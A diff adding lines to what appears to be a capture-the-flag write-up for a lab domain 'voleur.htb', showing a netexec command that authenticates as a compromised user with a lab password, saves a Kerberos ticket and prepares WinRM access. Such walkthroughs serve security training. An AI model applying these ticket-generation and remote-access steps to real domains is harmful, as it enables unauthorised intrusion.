@@ -454,6 +454,20 @@ SMB         dc.voleur.htb   445    dc               [+] voleur.htb\jeremy.combs:
 ```
 This user is now compromised
 
+This user is also apart of Remote management
 
+```python
+faketime -f +8h nxc smb dc.voleur.htb -u 'jeremy.combs' -p 'qT3V9pLXyN7W4m' -k --generate-tgt jeremy_combs 
+SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc.voleur.htb   445    dc               [+] voleur.htb\jeremy.combs:qT3V9pLXyN7W4m 
+SMB         dc.voleur.htb   445    dc               [+] TGT saved to: jeremy_combs.ccache
+SMB         dc.voleur.htb   445    dc               [+] Run the following command to use the TGT: export KRB5CCNAME=jeremy_combs.ccache
+```
+Ive generate a TGT and exported it so now i can get access via WINRM as this user
+
+# Evil-winrm as `jeremy.combs`
+```python
+
+```
 
 
